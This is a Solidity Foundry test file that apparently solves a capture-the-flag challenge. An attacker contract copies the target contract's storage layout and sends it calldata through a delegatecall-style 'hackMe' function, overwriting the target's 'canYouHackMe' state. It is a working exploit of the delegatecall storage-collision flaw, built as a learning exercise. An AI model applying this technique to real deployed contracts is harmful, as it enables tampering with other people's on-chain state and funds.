// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test, console} from "@forge-std/Test.sol";


interface IDelegateD3{
    function hackMe(bytes calldata bites) external returns(bool , bytes memory);
    function hacked() external;
    function canYouHackMe(address _addr) external returns(bool);
}

contract Attacker  {
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    IDelegateD3 d3Contract;

    constructor(IDelegateD3 _d3){
        d3Contract = _d3;
    }

    function hacked() public{
        canYouHackMe[msg.sender] = true;
    }

    function setupAttack(bytes memory data) public {
        // msg.sender ->  D3contract ka address khud wo msg.sender hoga 
        // call opcode use krega
        d3Contract.hackMe(data);   
    }
}
contract DelegateD3Test is Test {
    IDelegateD3 delegate;
    function setUp() public {
        address contractAddr = deployCode("src/DelegateD3.sol:D31eg4t3");
        delegate = IDelegateD3(contractAddr);
    }

    function test_delegate() public {
        bytes memory data = abi.encodeWithSignature("hacked()");
        console.log("Entered in test ");
        

        Attacker attackerContract = new Attacker(delegate);

        vm.startPrank(address(attackerContract));
        attackerContract.setupAttack(data);
        console.log("cna you haack me ? : ");
        bool val = delegate.canYouHackMe(address(attackerContract));
        console.log(val);
        vm.stopPrank();

    }
}